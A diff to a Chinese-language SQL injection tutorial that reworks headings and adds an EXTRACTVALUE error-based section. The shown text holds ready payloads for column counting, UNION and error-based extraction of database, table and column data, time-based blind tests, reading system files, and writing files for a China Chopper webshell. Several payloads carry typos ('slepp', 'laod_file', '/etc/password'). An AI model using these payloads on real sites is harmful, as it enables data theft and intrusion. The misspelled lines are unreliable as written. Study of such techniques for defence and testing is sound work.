@@ -12,7 +12,7 @@
 - [X-Forwarded-For 请求协议头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
 - 文件名
 
-### 判断字段数目
+## 判断字段数目
 
 ```sql
 ?id=1' order by 4--+
@@ -24,7 +24,7 @@
 继续缩小数值测试`?id=1' order by 3 --+ `此时页面返回正常，
 更换大的数字测试`?id=1' order by 4 --+` 此时页面返回错误，3 正常，4 错误，说明字段数目就是 3
 
-### 基于报错的注入
+## 基于报错的注入
 
 通过 id=-1 一个负数不存在的 id 值来触发报错，基于报错来的信息来对 sql 语句进行修改，进而达到目的。
 
@@ -38,11 +38,11 @@ id=-1' UNION SELECT 1,2,3 --+
 id=1' or 1=1 UNION SELECT 1,2,3 --+
 ```
 
-### XPath 相关
+## XPath 相关
 
 [XPath](https://www.w3school.com.cn/xpath/index.asp)
 
-#### UPDATEXML
+### UPDATEXML
 
 `UPDATEXML()` 是 MySQL 的一个非常有用的函数，它可以让你修改 XML 数据，并将结果作为更新后的 XML 字符串返回。
 
@@ -87,7 +87,42 @@ SELECT
 
 例如，`select * from test where ide = 1 and (UPDATEXML(1,0x7e,3))`; 由于 0x7e 是~，不属于 xpath 语法格式，因此报出 xpath 语法错误。
 
-### 基于时间的盲注
+### EXTRACTVALUE
+
+`extractvalue` 函数在 MySQL 中是一个 XML 函数，用于从 XML 类型的数据中提取值。
+
+使用语法：
+
+```sql
+extractvalue(目标xml文档，xml路径)
+```
+
+我们可以操作的是第二个参数，示例如下：
+
+例如，从数据库中获取当前数据库名称：
+
+```sql
+1' and extractvalue(1, concat(0x7e,database(),0x7e)) --+
+```
+
+获取所有表的名称：
+
+```sql
+1' and extractvalue(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+
+```
+获取某个特定表中的列名：
+
+```sql
+1' and extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='<table_name>'),0x7e)) --+
+```
+
+获取某个特定列中的数据：
+
+```sql
+1' and extractvalue(1, concat(0x7e,(select group_concat(<column_name>) from <table_name>),0x7e)) --+
+```
+
+## 基于时间的盲注
 
 ```sql
 1' and slepp(5) --+
@@ -96,13 +131,13 @@ SELECT
 
 如果等 5 秒之后有回显，则代表有漏洞。
 
-### 读取文件
+## 读取文件
 
 ```sql
 =1' and 1=2 union select laod_file('/etc/password') #
 ```
 
-### 文件写入
+## 文件写入
 
 文件写入配合菜刀提权。
 
